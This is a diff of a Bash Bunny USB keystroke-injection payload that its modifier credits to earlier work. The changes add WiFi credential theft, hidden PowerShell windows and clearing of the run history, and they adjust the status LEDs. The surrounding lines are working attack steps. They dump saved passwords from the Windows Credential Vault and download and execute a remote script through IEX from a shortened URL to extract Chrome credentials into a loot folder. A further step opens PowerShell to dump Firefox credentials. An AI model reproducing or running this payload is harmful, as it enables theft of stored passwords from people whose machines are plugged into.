@@ -11,12 +11,19 @@
 # https://github.com/EmpireProject/Empire    Get-FoxDump.ps1
 #
 #
-# WLAN Extension: QDBA
+# Author:		QDBA
+#
+# Did some changes to the original script of illwill
+# - Minimize powershell Windows
+# - Fetch WiFi Credentials
+# - Clear Run History
+# - Some changes on LED (only for me)
+
 
 
 # White..............Some Preps
 # Purple.............Start Powershell 
-# Red................Running Script
+# Amber blinking ....Running Script
 # Green..............Got All Creds (Script finished)
 
 
@@ -45,7 +52,7 @@ Q STRING \$Bunny \= \(gwmi win32_volume -f \'label\=\'\'BashBunny\'\'\' \|  Sele
 Q ENTER
 Q DELAY 100
 
-LED R
+LED R G 200
 #Dump Credential Vault (I.E./Edge)
 Q STRING \$ClassHolder \= \[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType\=WindowsRuntime\]\;
 Q STRING \$VaultObj \= new-object Windows.Security.Credentials.PasswordVault\; \$VaultObj.RetrieveAll\(\) \| 
@@ -54,7 +61,6 @@ Q STRING select Resource, UserName, Password \| Sort-Object Resource \| ft -Auto
 Q ENTER
 Q DELAY 100
 
-LED R
 #Dump Chrome Creds
 Q STRING IEX \(New-Object Net.WebClient\).DownloadString\(\'http:\/\/bit.ly\/2mFjedI\'\)\; Get-ChromeCreds \| ft -AutoSize \| Out-File -Append \$Bunny\\loot\\BrowserCreds\\\$env:computername.txt
 Q ENTER
@@ -69,7 +75,6 @@ Q STRING exit
 Q ENTER
 Q DELAY 1000
 
-LED R
 #Open 32bit powershell and Dump Firefox Creds
 Q GUI r
 Q DELAY 100
